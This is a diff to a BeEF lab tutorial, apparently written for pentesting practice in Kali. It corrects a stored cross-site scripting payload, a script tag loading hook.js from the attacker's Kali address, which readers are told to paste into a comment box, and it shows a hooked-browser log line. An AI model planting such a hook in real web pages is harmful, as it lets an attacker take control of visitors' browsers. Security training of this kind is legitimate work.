@@ -32,7 +32,7 @@ context.
     $ ./beef
   In Kali, open the BeEF UI URL: UI URL:   http://127.0.0.1:3000/ui/panel  
   Copy the UI URL link: http://<kali ip>:3000/ui/panel
-  Add this line into the attacked browser (in a comment box): <script src="http<kali ip>:3000/hook.js></script>
+  Add this line into the attacked browser (in a comment box): <script src="http://<kali ip>:3000/hook.js></script>
   You should see a new hooked browser: 
     [ 2:46:19][*] New Hooked Browser [id:1, ip:<hooked ip>, browser:FF-47, os:Windows-10], hooked origin [127.0.0.1:80]
   Look at Looked Browsers and click on the newly hooked machine.
@@ -88,7 +88,7 @@ context.
 >@  -In Kali, open the BeEF UI URL: http://127.0.0.1:3000/ui/panel.
 >@  Copy the UI URL link: http://<kali ip>:3000/ui/panel.
 >@
->@  -Add this line into the attacked browser (in a comment box): <script src="http<kali ip>:3000/hook.js></script>
+>@  -Add this line into the attacked browser (in a comment box): <script src="http://<kali ip>:3000/hook.js></script>
 >@  You should see a new hooked browser: 
 >@    [ 2:46:19][*] New Hooked Browser [id:1, ip:<hooked ip>, browser:FF-47, os:Windows-10], hooked origin [127.0.0.1:80]
 >@
